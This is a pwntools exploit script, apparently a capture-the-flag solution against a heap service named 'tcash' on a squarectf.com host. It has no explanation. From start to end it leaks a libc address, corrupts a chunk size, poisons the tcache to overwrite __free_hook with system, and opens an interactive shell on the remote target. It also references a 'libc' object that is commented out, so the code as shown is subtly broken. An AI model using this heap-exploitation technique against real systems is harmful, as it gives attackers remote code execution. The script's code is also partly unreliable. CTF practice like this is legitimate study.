from pwn import *

elf = ELF("./tcash")

def malloc(slot,size):
    p.sendlineafter("> ",str(1))
    p.sendlineafter("slot (0-9)?",str(slot))
    p.sendlineafter("size:",str(size))
    print(p.recv())
def write(slot,data):
    p.sendlineafter("> ",str(2))
    p.sendlineafter("slot (0-9)?",str(slot))
    p.sendlineafter("data:",str(data))
    print(p.recv())
def prints(slot):
    p.sendlineafter("> ",str(3))
    p.sendlineafter("slot (0-9)?",str(slot))
    return p.recv()
def free(slot):
    p.sendlineafter("> ",str(4))
    p.sendlineafter("slot (0-9)?", str(slot))
    print(p.recv())
def secret(data):
    p.sendlineafter("> ",str(1337))
    p.sendlineafter("slot (0-9)?", str(1))
    p.sendlineafter("data 1:", str('aaaa'))
    p.sendlineafter("data 2:", str(data))
libc_offset =0x3ebc40 

#p = process(["/home/hacker/tools/pwn/libc-database/libs/libc6_2.27-3ubuntu1_amd64/ld-2.27.so","./tcash"],env={'LD_PRELOAD': '/home/hacker/tools/pwn/libc-database/libs/libc6_2.27-3ubuntu1_amd64/libc-2.27.so'})
#p = process("./tcash")
#libc = ELF("/home/hacker/tools/pwn/libc-database/libs/libc6_2.27-3ubuntu1_amd64/libc-2.27.so")
p = remote('tcash-a57a558adff75b59.squarectf.com',7852)
#p = remote('localhost',7852)
malloc(0,0)
malloc(1,0x6f8)
malloc(2,0)
malloc(3,0x6f8)
malloc(4,0x6f8)
free(1)
free(3)
malloc(1,0x6f8)
malloc(3,0x6f8)
one_gadget = 0x4f2c5
one_gadget = 0x4f322
one_gadget = 0x10a38c

prints(0)
leak = p.recvuntil('malloc')
fd = u64(leak[1792:1800])
bk =  u64(leak[1800:1808])
libc_base = fd-libc_offset-96
info('fd %s'%hex(fd))
info('bk %s'%hex(bk))
info("libc base %s"%hex(libc_base))

#libc_base = 0x7ffff7dc3000
sz_overwrite = 'a'*0x6f8+p64(0x311)
write(0,sz_overwrite)
free(1)


fd_overwrite = 'a'*(1792-8)+p64(0x311)+p64(libc_base+libc.symbols['__free_hook'])
write(0,fd_overwrite)
rce = p64(libc_base+ libc.symbols["system"])
info('one gadget %s'%hex(u64(rce)))
secret(rce)
raw_input("hai")
#malloc(6,100)
#write(8,'/bin/sh')
#free(6)
#gdb.attach(p,'b *0x555555554e17')
p.interactive()
